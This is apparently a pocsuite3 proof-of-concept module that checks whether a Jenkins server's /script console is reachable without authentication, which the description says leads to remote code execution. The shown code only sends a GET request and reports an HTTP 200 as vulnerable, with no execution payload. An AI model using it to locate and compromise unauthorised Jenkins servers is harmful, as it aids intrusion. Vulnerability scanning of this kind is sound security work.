from collections import OrderedDict
from urllib.parse import quote

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptDict, VUL_TYPE
from pocsuite3.lib.utils import random_str


class JenkinsScript(POCBase):
    vulID = '97017'  # ssvid
    version = '1.0'
    references = ['']
    author = ['fuzzingq']
    createDate = '2022-07-29'
    updateDate = '2022-07-29'
    name = 'jenkins script 未授权访问 导致rce'
    appName = 'jenkins'
    risk = 'High'
    appVersion = 'all'
    desc = '''jenkins script 未授权访问 导致rce'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _check(self, url):
        url = url.rstrip("/")
        headers = {'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6"}
        url = url + "/script"
        r = requests.get(url, headers=headers)
        if r.status_code == 200:
            return url
        return False


    def _verify(self):
        result = {}
        p = self._check(self.url)
        if p:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['URL'] = p
            result['VerifyInfo']['risk'] = self.risk
            result['VerifyInfo']['vul_detail'] = self.desc

        return self.parse_output(result)


    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(JenkinsScript)